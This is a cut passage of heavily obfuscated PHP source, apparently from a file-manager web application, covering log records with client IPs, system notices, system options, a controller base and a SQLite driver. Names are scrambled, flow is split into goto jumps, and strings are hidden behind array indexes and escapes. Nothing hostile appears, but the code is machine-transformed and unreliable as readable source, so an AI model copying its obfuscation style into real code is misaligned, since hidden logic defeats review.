$e§±ßÔäù[1866] => LNG($e§±ßÔäù[1867]), $e§±ßÔäù[1868] => LNG($e§±ßÔäù[1868]), $e§±ßÔäù[1869] => LNG($e§±ßÔäù[1870]), $e§±ßÔäù[1871] => LNG($e§±ßÔäù[1872]), $e§±ßÔäù[1873] => LNG($e§±ßÔäù[1874]), $e§±ßÔäù[1875] => LNG($e§±ßÔäù[1876]), $e§±ßÔäù[1877] => LNG($e§±ßÔäù[1878]), $e§±ßÔäù[1879] => LNG($e§±ßÔäù[1880])); } private function typeFile() { $Dí»ÓµÈŠ„ =& $_SERVER[İë¬“ÅÒÛ›]; $e÷°¬ñ¥„à = array($Dí»ÓµÈŠ„[1521] => array($Dí»ÓµÈŠ„[1522]), $Dí»ÓµÈŠ„[1827] => array($Dí»ÓµÈŠ„[1881]), $Dí»ÓµÈŠ„[1829] => array($Dí»ÓµÈŠ„[1882]), $Dí»ÓµÈŠ„[1516] => array($Dí»ÓµÈŠ„[1517]), $Dí»ÓµÈŠ„[1835] => array(), $Dí»ÓµÈŠ„[1837] => array(), $Dí»ÓµÈŠ„[1839] => array(), $Dí»ÓµÈŠ„[1524] => array($Dí»ÓµÈŠ„[1526]), $Dí»ÓµÈŠ„[1525] => array($Dí»ÓµÈŠ„[1526]), $Dí»ÓµÈŠ„[1843] => array($Dí»ÓµÈŠ„[1883]), $Dí»ÓµÈŠ„[1845] => array($Dí»ÓµÈŠ„[1883]), $Dí»ÓµÈŠ„[1847] => array($Dí»ÓµÈŠ„[1884]), $Dí»ÓµÈŠ„[1833] => array($Dí»ÓµÈŠ„[1885]), $Dí»ÓµÈŠ„[1849] => array($Dí»ÓµÈŠ„[1886]), $Dí»ÓµÈŠ„[1851] => array($Dí»ÓµÈŠ„[1887]), $Dí»ÓµÈŠ„[1519] => array($Dí»ÓµÈŠ„[1520])); return $e÷°¬ñ¥„à; } private function typeAll() { goto fÀ´‹Û±‡; E‚›µ’ß­: foreach ($Aß¢âêè´ö as $aŞ¢Š¨´¤Ë => $dÊ¹Ö×¥ó) { $fˆÇ¼¦ ½[$dÊ¹Ö×¥ó[0]] = $fˆÇ¼¦ ½[$aŞ¢Š¨´¤Ë]; } $fˆÇ¼¦ ½[$D¢ª˜ï‰°[1526]] = LNG($D¢ª˜ï‰°[1888]); $fˆÇ¼¦ ½[$D¢ª˜ï‰°[1883]] = LNG($D¢ª˜ï‰°[1889]); goto CŸğ”Ê¦’ƒ; fÀ´‹Û±‡: $D¢ª˜ï‰° =& $_SERVER[İë¬“ÅÒÛ›]; $fˆÇ¼¦ ½ = $this->typeList; $Aß¢âêè´ö = array_filter($this->typeFile()); goto E‚›µ’ß­; CŸğ”Ê¦’ƒ: return $fˆÇ¼¦ ½; goto C¨Éƒ‘‹‰æ; C¨Éƒ‘‹‰æ: } public function addLog($B¹”÷á™›“, $eÃÚÜã©ë = array()) { goto e¼ö°ƒß; AÈˆÛì‰à: $d®Ìö÷¥ö = get_client_ip(); if (!$eÃÚÜã©ë || strlen(json_encode($eÃÚÜã©ë)) >= 1024) { $eÃÚÜã©ë = array($DÃˆÖ°â…[1890] => $d®Ìö÷¥ö); } else { if (is_array($eÃÚÜã©ë)) { $eÃÚÜã©ë[$DÃˆÖ°â…[1890]] = $d®Ìö÷¥ö; } else { $eÃÚÜã©ë = array($DÃˆÖ°â…[786] => $eÃÚÜã©ë, $DÃˆÖ°â…[1890] => $d®Ìö÷¥ö); } } $eÃÚÜã©ë = array($DÃˆÖ°â…[1085] => Session::sign(), $DÃˆÖ°â…[1086] => $BóÛ«Èª…, $DÃˆÖ°â…[29] => $B¹”÷á™›“, $DÃˆÖ°â…[1088] => json_encode($eÃÚÜã©ë)); goto dÊâ²Ññ²; e¼ö°ƒß: $DÃˆÖ°â… =& $_SERVER[İë¬“ÅÒÛ›]; if (!isset($this->typeList[$B¹”÷á™›“])) { return; } $BóÛ«Èª… = USER_ID ? USER_ID : (isset($eÃÚÜã©ë[$DÃˆÖ°â…[1095]]) ? $eÃÚÜã©ë[$DÃˆÖ°â…[1095]] : 0); goto AÈˆÛì‰à; dÊâ²Ññ²: parent::add($eÃÚÜã©ë); goto D¸Á¡½ŠÏÊ; D¸Á¡½ŠÏÊ: } public function remove($dØ¸’ø¸â) { $this->where(array($_SERVER[İë¬“ÅÒÛ›][817] => $dØ¸’ø¸â))->delete(); } private function _makeOrder($fÕéÜ¶‹Ô” = '') { goto CÃ ã¬«; fí®åÖÑÈ: $FéˆßŒÑ‘ = Input::get($BÂğÓ‚·[1588], $BÂğÓ‚·[7], $BÂğÓ‚·[1689], array($BÂğÓ‚·[1634], $BÂğÓ‚·[1513])); $FéˆßŒÑ‘ = $C‡×ÕÖÎ„³[$FéˆßŒÑ‘]; $fÕéÜ¶‹Ô” = $fÕéÜ¶‹Ô” . "{$EäÀáÀáÎñ}\x20{$FéˆßŒÑ‘}"; goto bíÎ•ñ“•ì; CÃ ã¬«: $BÂğÓ‚· =& $_SERVER[İë¬“ÅÒÛ›]; $EäÀáÀáÎñ = $BÂğÓ‚·[187]; $C‡×ÕÖÎ„³ = array($BÂğÓ‚·[1632] => $BÂğÓ‚·[1633], $BÂğÓ‚·[1513] => $BÂğÓ‚·[1590]); goto fí®åÖÑÈ; bíÎ•ñ“•ì: return $this->order($fÕéÜ¶‹Ô”); goto F¦Œ£ÍÑ›‰; F¦Œ£ÍÑ›‰: } public function get($C‚òîöÚÖ¶ = '') { goto Fà¾á¥õÆ³; Fˆ¦„íŠ«: return $Døà¶—øÓÅ; goto b£ˆÉ˜ª´; f“óœ­ó¼: if ($C‚òîöÚÖ¶[$dÈˆ°¹˜ù[1095]]) { $EÌÎĞõ¿Ú[$dÈˆ°¹˜ù[1095]] = $C‚òîöÚÖ¶[$dÈˆ°¹˜ù[1095]]; } if (isset($C‚òîöÚÖ¶[$dÈˆ°¹˜ù[460]])) { $AâèœäÅ¤ß = $C‚òîöÚÖ¶[$dÈˆ°¹˜ù[460]]; $AÌøÄ†”²ß = isset($C‚òîöÚÖ¶[$dÈˆ°¹˜ù[461]]) ? $C‚òîöÚÖ¶[$dÈˆ°¹˜ù[461]] : time(); $EÌÎĞõ¿Ú[$dÈˆ°¹˜ù[187]] = array($dÈˆ°¹˜ù[325], array($AâèœäÅ¤ß, $AÌøÄ†”²ß)); } if ($C‚òîöÚÖ¶[$dÈˆ°¹˜ù[29]]) { $d Ç³¶œÃ = explode($dÈˆ°¹˜ù[47], $C‚òîöÚÖ¶[$dÈˆ°¹˜ù[29]]); $a¶ŠÕ…ÎÈ = $this->typeFile(); $f›ŞöœŒì = array(); foreach ($d Ç³¶œÃ as $cñ•„ôéğ½) { $f›ŞöœŒì[] = $cñ•„ôéğ½; if (isset($a¶ŠÕ…ÎÈ[$cñ•„ôéğ½])) { $f›ŞöœŒì = array_merge($f›ŞöœŒì, $a¶ŠÕ…ÎÈ[$cñ•„ôéğ½]); } } $f›ŞöœŒì = array_unique($f›ŞöœŒì); if ($f›ŞöœŒì) { $EÌÎĞõ¿Ú[$dÈˆ°¹˜ù[29]] = array($dÈˆ°¹˜ù[7], $f›ŞöœŒì); } } goto b“ĞæÊ„ÈÛ; b“ĞæÊ„ÈÛ: $Døà¶—øÓÅ = $this->_makeOrder()->where($EÌÎĞõ¿Ú)->selectPage(); if (empty($Døà¶—øÓÅ[$dÈˆ°¹˜ù[357]])) { show_json(array(), !0, $Døà¶—øÓÅ[$dÈˆ°¹˜ù[354]]); } $Døà¶—øÓÅ[$dÈˆ°¹˜ù[357]] = $this->logList($Døà¶—øÓÅ[$dÈˆ°¹˜ù[357]]); goto Fˆ¦„íŠ«; Fà¾á¥õÆ³: $dÈˆ°¹˜ù =& $_SERVER[İë¬“ÅÒÛ›]; if (!$C‚òîöÚÖ¶) { show_json(array()); } $EÌÎĞõ¿Ú = array(); goto f“óœ­ó¼; b£ˆÉ˜ª´: } private function ipAddress(&$B‡¸ŒÆ„•Ì) { $A´ÀèÎò„ =& $_SERVER[İë¬“ÅÒÛ›]; if (!empty($B‡¸ŒÆ„•Ì[$A´ÀèÎò„[1890]])) { $B¥ØŠˆÚôí = IpLocation::get($B‡¸ŒÆ„•Ì[$A´ÀèÎò„[1890]]); if ($B¥ØŠˆÚôí == $A´ÀèÎò„[1891]) { $B¥ØŠˆÚôí = $A´ÀèÎò„[1892]; } } else { $B¥ØŠˆÚôí = LNG($A´ÀèÎò„[1893]); } $B‡¸ŒÆ„•Ì[$A´ÀèÎò„[1894]] = $B¥ØŠˆÚôí; } private function getSourceList(&$A®«¥­¡Í­) { $F›„„ïŒ§Û =& $_SERVER[İë¬“ÅÒÛ›]; $dŠ§Û•Ãô‚ = array(); foreach ($A®«¥­¡Í­ as $c‘³Œ›Ë˜‚ => $bØ¸ï¹ÓÃ¤) { $f¹¦˜¤¬¿– = json_decode($bØ¸ï¹ÓÃ¤[$F›„„ïŒ§Û[1590]], !0); if (strpos($bØ¸ï¹ÓÃ¤[$F›„„ïŒ§Û[29]], $F›„„ïŒ§Û[1727]) !== 0) { goto eî¹ŸìÇÜ; eî¹ŸìÇÜ: if (!isset($f¹¦˜¤¬¿–[$F›„„ïŒ§Û[76]]) || strpos($bØ¸ï¹ÓÃ¤[$F›„„ïŒ§Û[29]], $F›„„ïŒ§Û[1895]) !== 0) { continue; } if (!IO::init($f¹¦˜¤¬¿–[$F›„„ïŒ§Û[76]])) { continue; } if (!($fóñîÍÂ à = IO::infoFull($f¹¦˜¤¬¿–[$F›„„ïŒ§Û[76]]))) { continue; } goto D‹¥ãÕ„‚¼; døìÏËàë·: continue; goto A¿ØõÄÒò¬; D‹¥ãÕ„‚¼: $dŠ§Û•Ãô‚[] = $f¹¦˜¤¬¿–[$F›„„ïŒ§Û[375]] = $fóñîÍÂ à[$F›„„ïŒ§Û[375]]; $dŠ§Û•Ãô‚[] = $f¹¦˜¤¬¿–[$F›„„ïŒ§Û[1726]] = $fóñîÍÂ à[$F›„„ïŒ§Û[385]]; $A®«¥­¡Í­[$c‘³Œ›Ë˜‚][$F›„„ïŒ§Û[1590]] = json_encode($f¹¦˜¤¬¿–); goto døìÏËàë·; A¿ØõÄÒò¬: } $dŠ§Û•Ãô‚[] = $f¹¦˜¤¬¿–[$F›„„ïŒ§Û[375]]; $dŠ§Û•Ãô‚[] = $f¹¦˜¤¬¿–[$F›„„ïŒ§Û[1726]]; if ($f¹¦˜¤¬¿–[$F›„„ïŒ§Û[29]] == $F›„„ïŒ§Û[745]) { $dŠ§Û•Ãô‚[] = $f¹¦˜¤¬¿–[$F›„„ïŒ§Û[1590]][$F›„„ïŒ§Û[755]]; $dŠ§Û•Ãô‚[] = $f¹¦˜¤¬¿–[$F›„„ïŒ§Û[1590]][$F›„„ïŒ§Û[756]]; } if ($f¹¦˜¤¬¿–[$F›„„ïŒ§Û[29]] == $F›„„ïŒ§Û[1730]) { $dŠ§Û•Ãô‚[] = $f¹¦˜¤¬¿–[$F›„„ïŒ§Û[1590]][$F›„„ïŒ§Û[375]]; } } if (!$dŠ§Û•Ãô‚) { return array(); } return Model($F›„„ïŒ§Û[522])->sourceListInfo($dŠ§Û•Ãô‚, !0); } private function logList($BÜ÷›¨µĞ¿) { goto C‘…Ù˜¢ë; b…èËÚ„Ô: foreach ($BÜ÷›¨µĞ¿ as $fš¯ºÙÓ => $Fğµ÷ ‡œ–) { goto EÂ†·ô„Šğ; EÂ†·ô„Šğ: $e£ ã¿ÃÎò = $Fğµ÷ ‡œ–[$CˆÙíã´Ó[29]]; $F’è¬ØÖ°‘ = $Fğµ÷ ‡œ–[$CˆÙíã´Ó[1095]]; $Fğµ÷ ‡œ–[$CˆÙíã´Ó[28]] = isset($Cë• ŠÈÜÏ[$F’è¬ØÖ°‘][$CˆÙíã´Ó[28]]) ? $Cë• ŠÈÜÏ[$F’è¬ØÖ°‘][$CˆÙíã´Ó[28]] : LNG($CˆÙíã´Ó[1893]); goto AŒÃÊìîï; eŠå·ò÷„Á: if (strpos($e£ ã¿ÃÎò, $CˆÙíã´Ó[1727]) === 0 || isset($BâËÀªÉèï[$CˆÙíã´Ó[1726]])) { goto BçÎ¬ËÔä˜; a‰ô°¤»å„: if ($BâËÀªÉèï[$CˆÙíã´Ó[1736]] && $BâËÀªÉèï[$CˆÙíã´Ó[1736]][$CˆÙíã´Ó[394]] == $CˆÙíã´Ó[827]) { unset($BÜ÷›¨µĞ¿[$fš¯ºÙÓ]); continue; } goto cµ¿ÎæË²; BçÎ¬ËÔä˜: $BâËÀªÉèï[$CˆÙíã´Ó[861]] = $bÚ²Ñ°æ‡©[$BâËÀªÉèï[$CˆÙíã´Ó[375]]]; $BâËÀªÉèï[$CˆÙíã´Ó[1736]] = $bÚ²Ñ°æ‡©[$BâËÀªÉèï[$CˆÙíã´Ó[1726]]]; if ($BâËÀªÉèï[$CˆÙíã´Ó[29]] == $CˆÙíã´Ó[745]) { $BâËÀªÉèï[$CˆÙíã´Ó[1590]][$CˆÙíã´Ó[755]] = $bÚ²Ñ°æ‡©[$BâËÀªÉèï[$CˆÙíã´Ó[1590]][$CˆÙíã´Ó[755]]]; $BâËÀªÉèï[$CˆÙíã´Ó[1590]][$CˆÙíã´Ó[756]] = $bÚ²Ñ°æ‡©[$BâËÀªÉèï[$CˆÙíã´Ó[1590]][$CˆÙíã´Ó[756]]]; } goto D¶Êê¶öç½; D¶Êê¶öç½: if ($BâËÀªÉèï[$CˆÙíã´Ó[29]] == $CˆÙíã´Ó[1730]) { $BâËÀªÉèï[$CˆÙíã´Ó[1590]][$CˆÙíã´Ó[375]] = $bÚ²Ñ°æ‡©[$BâËÀªÉèï[$CˆÙíã´Ó[1590]][$CˆÙíã´Ó[375]]]; } if ($BâËÀªÉèï[$CˆÙíã´Ó[29]] == $CˆÙíã´Ó[1514]) { $BâËÀªÉèï[$CˆÙíã´Ó[1736]] = $BâËÀªÉèï[$CˆÙíã´Ó[861]]; $BâËÀªÉèï[$CˆÙíã´Ó[1726]] = $BâËÀªÉèï[$CˆÙíã´Ó[1736]][$CˆÙíã´Ó[375]]; $BâËÀªÉèï[$CˆÙíã´Ó[861]] = !1; $BâËÀªÉèï[$CˆÙíã´Ó[375]] = $CˆÙíã´Ó[33]; } if ($BâËÀªÉèï[$CˆÙíã´Ó[861]] && $BâËÀªÉèï[$CˆÙíã´Ó[861]][$CˆÙíã´Ó[394]] == $CˆÙíã´Ó[827]) { unset($BÜ÷›¨µĞ¿[$fš¯ºÙÓ]); continue; } goto a‰ô°¤»å„; cµ¿ÎæË²: } $Fğµ÷ ‡œ–[$CˆÙíã´Ó[1590]] = $BâËÀªÉèï; $FÌÜŠ³ ®¡[] = $Fğµ÷ ‡œ–; goto d ¿¡Ì‡¤; AŒÃÊìîï: $Fğµ÷ ‡œ–[$CˆÙíã´Ó[1770]] = isset($Cë• ŠÈÜÏ[$F’è¬ØÖ°‘][$CˆÙíã´Ó[1770]]) ? $Cë• ŠÈÜÏ[$F’è¬ØÖ°‘][$CˆÙíã´Ó[1770]] : $CˆÙíã´Ó[33]; $Fğµ÷ ‡œ–[$CˆÙíã´Ó[1004]] = isset($E¤“ÙÕÛÔ˜[$e£ ã¿ÃÎò]) ? $E¤“ÙÕÛÔ˜[$e£ ã¿ÃÎò] : (strpos($e£ ã¿ÃÎò, $CˆÙíã´Ó[1896]) == 0 ? LNG($CˆÙíã´Ó[1897]) : LNG($CˆÙíã´Ó[1893])); $Fğµ÷ ‡œ–[$CˆÙíã´Ó[1688]] = isset($Cë• ŠÈÜÏ[$F’è¬ØÖ°‘]) ? $Cë• ŠÈÜÏ[$F’è¬ØÖ°‘] : !1; goto aÔÚ±÷†í±; aÔÚ±÷†í±: $BâËÀªÉèï = json_decode($Fğµ÷ ‡œ–[$CˆÙíã´Ó[1590]], !0); $Fğµ÷ ‡œ–[$CˆÙíã´Ó[1890]] = isset($BâËÀªÉèï[$CˆÙíã´Ó[1890]]) ? $BâËÀªÉèï[$CˆÙíã´Ó[1890]] : $CˆÙíã´Ó[33]; $this->ipAddress($Fğµ÷ ‡œ–); goto eŠå·ò÷„Á; d ¿¡Ì‡¤: } return $FÌÜŠ³ ®¡; goto DÖĞ¦â±½‡; Aâ±é‰½‚š: $bÚ²Ñ°æ‡© = $this->getSourceList($BÜ÷›¨µĞ¿); $E¤“ÙÕÛÔ˜ = $this->typeAll(); $FÌÜŠ³ ®¡ = array(); goto b…èËÚ„Ô; C‘…Ù˜¢ë: $CˆÙíã´Ó =& $_SERVER[İë¬“ÅÒÛ›]; $Aá¨ì¯ = array_to_keyvalue($BÜ÷›¨µĞ¿, $CˆÙíã´Ó[33], $CˆÙíã´Ó[1095]); $Cë• ŠÈÜÏ = Model($CˆÙíã´Ó[1481])->userListInfo(array_unique($Aá¨ì¯)); goto Aâ±é‰½‚š; DÖĞ¦â±½‡: } public function deviceList($fÍ¥‰Á§³, $CÆ¹×ŠÂ‘Æ = null) { goto Aù­ÛŸö•; eŠêÒåñÁÃ: return array_values($aÕ«½¦‹è˜); goto DÁŸÔ•¿Ÿ; E‘¥ˆæå»‰: $cÌê’›¨²ö = $this->where($f£õò¦Â¿œ)->order($bÙó“²¡àß[1733])->select(); $aÕ«½¦‹è˜ = array(); foreach ($cÌê’›¨²ö as $fİ£¨µ’ => &$A¦ƒ¿£‹è) { goto d—ÂòñÈÍô; d—ÂòñÈÍô: $FÄ¯›Ê÷˜ = json_decode($A¦ƒ¿£‹è[$bÙó“²¡àß[1590]], !0); $A¦ƒ¿£‹è[$bÙó“²¡àß[1890]] = isset($FÄ¯›Ê÷˜[$bÙó“²¡àß[1890]]) ? $FÄ¯›Ê÷˜[$bÙó“²¡àß[1890]] : $bÙó“²¡àß[33]; unset($FÄ¯›Ê÷˜[$bÙó“²¡àß[1890]]); goto bÀ´ˆÒƒ¬ë; dÅáÉÊ”¸­: $A¦ƒ¿£‹è[$bÙó“²¡àß[1590]] = $FÄ¯›Ê÷˜; $aÕ«½¦‹è˜[$fááŞ÷÷Ôï] = $A¦ƒ¿£‹è; goto E’Ëµğœ™; bÀ´ˆÒƒ¬ë: $fááŞ÷÷Ôï = md5(json_encode($FÄ¯›Ê÷˜)); if (isset($aÕ«½¦‹è˜[$fááŞ÷÷Ôï])) { unset($cÌê’›¨²ö[$fİ£¨µ’]); continue; } $this->ipAddress($A¦ƒ¿£‹è); goto dÅáÉÊ”¸­; E’Ëµğœ™: } goto eŠêÒåñÁÃ; Aù­ÛŸö•: $bÙó“²¡àß =& $_SERVER[İë¬“ÅÒÛ›]; $f£õò¦Â¿œ = array($bÙó“²¡àß[1095] => $fÍ¥‰Á§³, $bÙó“²¡àß[29] => $bÙó“²¡àß[1486]); if ($CÆ¹×ŠÂ‘Æ) { $f£õò¦Â¿œ[$bÙó“²¡àß[187]] = array($bÙó“²¡àß[698], $CÆ¹×ŠÂ‘Æ); } goto E‘¥ˆæå»‰; DÁŸÔ•¿Ÿ: } } class SystemNoticeModel extends ModelBaseLight { public $optionType = "\x53\171\x73\164\x65\155\56\x6e\157\164\x69\143\145\114\151\163\164"; public $field = array("\156\141\x6d\145", "\143\157\x6e\x74\145\156\164", "\141\x75\x74\150", "\155\x6f\x64\x65", "\164\151\155\145", "\164\171\x70\145", "\x73\157\x72\x74"); public function listData($dÌ²˜Ò¢¤à = false, $Dî‚»–†Í¥ = "\x73\157\162\164", $F—áƒ‡¡ô¿ = false) { return parent::listData($dÌ²˜Ò¢¤à, $Dî‚»–†Í¥, $F—áƒ‡¡ô¿); } public function add($BîâÆ×³œ) { goto aÔçíÀé; aÔçíÀé: $eèŸ‘Ê ™ =& $_SERVER[İë¬“ÅÒÛ›]; $E§‚ÆÇÆ¦‘ = $this->findByName($BîâÆ×³œ[$eèŸ‘Ê ™[28]]); if ($E§‚ÆÇÆ¦‘) { return !1; } goto Dùâİ¨Œ„; BˆÈÈ“Õ†â: return parent::insert($BîâÆ×³œ); goto a‰Û‘À³ÛĞ; Dùâİ¨Œ„: $Bê˜Ü‰ÜéÅ = time(); if ($BîâÆ×³œ[$eèŸ‘Ê ™[12]] == $eèŸ‘Ê ™[1898]) { $Bê˜Ü‰ÜéÅ = strtotime($BîâÆ×³œ[$eèŸ‘Ê ™[190]]); } $BîâÆ×³œ[$eèŸ‘Ê ™[190]] = $Bê˜Ü‰ÜéÅ; goto BˆÈÈ“Õ†â; a‰Û‘À³ÛĞ: } public function update($b°‘­Ê…öÍ, $EÍ†¡ÁöˆÇ) { goto F¼Æä‹Ã¡; C³š¤…¬¿: $EÍ†¡ÁöˆÇ[$bÌìôìÃì[190]] = $e¢È®ÑæÅ; return parent::update($b°‘­Ê…öÍ, $EÍ†¡ÁöˆÇ); goto A¢‚¹ÀÙ˜‡; DÙÕ‘‚ËÚ: if (!$aîñæ¶´ || $Aí…—²òš && $Aí…—²òš[$bÌìôìÃì[369]] != $aîñæ¶´[$bÌìôìÃì[369]]) { return !1; } $e¢È®ÑæÅ = time(); if ($EÍ†¡ÁöˆÇ[$bÌìôìÃì[12]] == $bÌìôìÃì[1898]) { $e¢È®ÑæÅ = strtotime($EÍ†¡ÁöˆÇ[$bÌìôìÃì[190]]); } goto C³š¤…¬¿; F¼Æä‹Ã¡: $bÌìôìÃì =& $_SERVER[İë¬“ÅÒÛ›]; $aîñæ¶´ = $this->listData($b°‘­Ê…öÍ); $Aí…—²òš = $this->findByName($EÍ†¡ÁöˆÇ[$bÌìôìÃì[28]]); goto DÙÕ‘‚ËÚ; A¢‚¹ÀÙ˜‡: } public function remove($BÒ‡÷¾÷†Ó) { $f¦¹´âì‚„ = $this->listData($BÒ‡÷¾÷†Ó); if (!$f¦¹´âì‚„ || $f¦¹´âì‚„[$_SERVER[İë¬“ÅÒÛ›][827]]) { return !1; } return parent::remove($BÒ‡÷¾÷†Ó); } public function sort($cä“Ëˆ¾, $bî¥íŒÔáÙ) { return parent::update($cä“Ëˆ¾, $bî¥íŒÔáÙ); } private function initUserOption() { $Dš´Çìåš =& $_SERVER[İë¬“ÅÒÛ›]; $this->optionType = $Dš´Çìåš[1899]; $this->modelType = $Dš´Çìåš[1900]; $this->field = array($Dš´Çìåš[1901], $Dš´Çìåš[28], $Dš´Çìåš[190], $Dš´Çìåš[29], $Dš´Çìåš[447], $Dš´Çìåš[180]); } public function userNoticeGet($C‚ÜÆ·’³ø = false) { $this->initUserOption(); return parent::listData($C‚ÜÆ·’³ø, $_SERVER[İë¬“ÅÒÛ›][369], !0); } public function userNoticeAdd($c‘ÂÎ´Õ÷Ò) { $d´ÕÅõ½¢Ò =& $_SERVER[İë¬“ÅÒÛ›]; $this->initUserOption(); $b‚ŞÒìÁâ¨ = $this->findByKey($d´ÕÅõ½¢Ò[1901], $c‘ÂÎ´Õ÷Ò[$d´ÕÅõ½¢Ò[369]]); if ($b‚ŞÒìÁâ¨) { return !0; } $a„æóÍºÓæ = array($d´ÕÅõ½¢Ò[1901] => $c‘ÂÎ´Õ÷Ò[$d´ÕÅõ½¢Ò[369]], $d´ÕÅõ½¢Ò[28] => $c‘ÂÎ´Õ÷Ò[$d´ÕÅõ½¢Ò[28]], $d´ÕÅõ½¢Ò[190] => $c‘ÂÎ´Õ÷Ò[$d´ÕÅõ½¢Ò[190]], $d´ÕÅõ½¢Ò[29] => isset($c‘ÂÎ´Õ÷Ò[$d´ÕÅõ½¢Ò[29]]) ? $c‘ÂÎ´Õ÷Ò[$d´ÕÅõ½¢Ò[29]] : 1, $d´ÕÅõ½¢Ò[447] => 0, $d´ÕÅõ½¢Ò[180] => 0); return parent::insert($a„æóÍºÓæ); } public function userNoticeEdit($a¢É ÉôÒ, $a¿°ÍÉÀæ) { $this->initUserOption(); return parent::update($a¢É ÉôÒ, $a¿°ÍÉÀæ); } } class SystemOptionModel extends ModelBaseOption { protected $tableName = "\x73\171\163\x74\x65\x6d\137\157\160\x74\x69\x6f\x6e"; protected $jsonField = array("\x6d\x65\156\x75", "\162\x6f\x6c\x65", "\x72\x6f\154\x65\107\x72\x6f\165\160", "\x72\x65\x67\151\163\164", "\145\155\141\x69\x6c"); function __construct() { parent::__construct(); } protected function cacheKey($b«¡ÛºŞ÷ø) { return "\x53\x79\x73\164\145\155\x4f\160\164\151\157\x6e\137{$b«¡ÛºŞ÷ø}"; } } goto eØØŠÖÌ¨Ó; aä†£ñùÂ: define($_SERVER[İë¬“ÅÒÛ›][1365], 4); define($_SERVER[İë¬“ÅÒÛ›][1366], 5); define($_SERVER[İë¬“ÅÒÛ›][1367], 16); goto E­îëÒÔ‡; C µ©ùí„æ: class ClassBaseCall { protected static $_methodListStatic = array(); protected static $_methodList = array(); public function __call($c”ÃöÖ¥»Æ, $eí«©‹ˆ²¾) { $d’¸ì³¢ù´ =& $_SERVER[İë¬“ÅÒÛ›]; if (isset(self::$_methodList[$c”ÃöÖ¥»Æ])) { return @call_user_func_array(self::$_methodList[$c”ÃöÖ¥»Æ], $eí«©‹ˆ²¾); } else { if (method_exists($this, $c”ÃöÖ¥»Æ)) { return call_user_func_array(array($this, $c”ÃöÖ¥»Æ), $eí«©‹ˆ²¾); } else { think_exception(__CLASS__ . $d’¸ì³¢ù´[4] . $c”ÃöÖ¥»Æ . $d’¸ì³¢ù´[5]); } } } public static function __callStatic($BÁïõƒ–¤„, $eØ±…Ê›§Ø) { if (isset(self::$_methodListStatic[$BÁïõƒ–¤„])) { return call_user_func_array(self::$_methodListStatic[$BÁïõƒ–¤„], $eØ±…Ê›§Ø); } else { if (method_exists(self, $BÁïõƒ–¤„)) { return call_user_func_array(array(self, $BÁïõƒ–¤„), $eØ±…Ê›§Ø); } else { show_json("{$BÁïõƒ–¤„}\50\51\40\x6e\157\164\40\x65\x78\x69\163\x74\x3b", !1); } } } public static function addMethod($bªª‚Ùë, $EÅ¼‚ŸÆÏ) { self::$_methodList[$bªª‚Ùë] = $EÅ¼‚ŸÆÏ; } public static function addMethodStatic($EõŸğ£…„Ø, $a¦Ï®¥ÓÄ) { self::$_methodListStatic[$EõŸğ£…„Ø] = $a¦Ï®¥ÓÄ; } } class Controller extends ClassBaseCall { public $in; public $config; public $tpl; public $values; function __construct() { goto b»ÔóÎ—”ã; BÃÔäƒô©ï: $this->in =& $in; $this->values[$DØ›ˆñ£ª²[6]] =& $config; $this->values[$DØ›ˆñ£ª²[7]] =& $in; goto bßÒìğÀ…›; bßÒìğÀ…›: $this->tpl = TEMPLATE . MOD . $DØ›ˆñ£ª²[8]; $this->_classObjectID = mt_rand(0, 10000); goto E¯ò¥Î‡; b»ÔóÎ—”ã: $DØ›ˆñ£ª² =& $_SERVER[İë¬“ÅÒÛ›]; global $in, $config; $this->config =& $config; goto BÃÔäƒô©ï; E¯ò¥Î‡: } public function loadClass($D³ùö¶ í) { if (1 === func_num_args()) { $this->{$D³ùö¶ í} = new $D³ùö¶ í(); } else { $c°¡ÏÈŸË = new ReflectionClass($D³ùö¶ í); $Aì‚Ò¼„±— = func_get_args(); array_shift($Aì‚Ò¼„±—); $this->{$D³ùö¶ í} = $c°¡ÏÈŸË->newInstanceArgs($Aì‚Ò¼„±—); } return $this->{$D³ùö¶ í}; } protected function assign($C›ñ®ĞÉÕ, $cßã×ÊÌŞñ) { $this->values[$C›ñ®ĞÉÕ] = $cßã×ÊÌŞñ; } protected function display($Eë§Â‚åÕ) { ob_end_clean(); extract($this->values); require $this->tpl . $Eë§Â‚åÕ; } } class DbSqliteBase extends Db { public function __construct($E¼ÊÃŞøµø = '') { $CáŠ·•ÛÌÖ =& $_SERVER[İë¬“ÅÒÛ›]; if (!extension_loaded($CáŠ·•ÛÌÖ[9])) { think_exception(think_lang($CáŠ·•ÛÌÖ[10]) . $CáŠ·•ÛÌÖ[11]); } if (!empty($E¼ÊÃŞøµø)) { if (!isset($E¼ÊÃŞøµø[$CáŠ·•ÛÌÖ[12]])) { $E¼ÊÃŞøµø[$CáŠ·•ÛÌÖ[12]] = 438; } $this->config = $E¼ÊÃŞøµø; if (empty($this->config[$CáŠ·•ÛÌÖ[13]])) { $this->config[$CáŠ·•ÛÌÖ[13]] = array(); } } } public function connect($AÈ„ğ”†‡‹ = '', $d¹ë§äÉßœ = 0) { $A’‰«¤³è• =& $_SERVER[İë¬“ÅÒÛ›]; if (!isset($this->linkID[$d¹ë§äÉßœ])) { goto E”°‘„ÈÂÏ; e‚«Ï‡É„ä: $this->linkID[$d¹ë§äÉßœ] = $EîÒóáİ™ì($AÈ„ğ”†‡‹[$A’‰«¤³è•[17]], $AÈ„ğ”†‡‹[$A’‰«¤³è•[12]]); if (!$this->linkID[$d¹ë§äÉßœ]) { think_exception(sqlite_error_string()); } $this->connected = !0; goto e»µ“Â–òÕ; E”°‘„ÈÂÏ: if (empty($AÈ„ğ”†‡‹)) { $AÈ„ğ”†‡‹ = $this->config; } $e«Ñïéˆ¯Ò = !empty($AÈ„ğ”†‡‹[$A’‰«¤³è•[13]][$A’‰«¤³è•[14]]) ? $AÈ„ğ”†‡‹[$A’‰«¤³è•[13]][$A’‰«¤³è•[14]] : $this->pconnect; $EîÒóáİ™ì = $e«Ñïéˆ¯Ò ? $A’‰«¤³è•[15] : $A’‰«¤³è•[16]; goto e‚«Ï‡É„ä; e»µ“Â–òÕ: @sqlite_busy_timeout($this->linkID[$d¹ë§äÉßœ], 30000); if (1 != think_config($A’‰«¤³è•[18])) { unset($this->config); } goto F˜é™®ù¥†; F˜é™®ù¥†: } return $this->linkID[$d¹ë§äÉßœ]; } public function free() { $this->queryID = null; } public function query($fÙ‰ó¯ç÷•) { goto C½Ç±º½ é; eŒ•Ş×Ú›Â: think_status($A†å·òø¾[20]); $this->queryID = sqlite_query($this->_linkID, $fÙ‰ó¯ç÷•); $this->debug(); goto FŠà‚èÌ†ã; FŠà‚èÌ†ã: if (!1 === 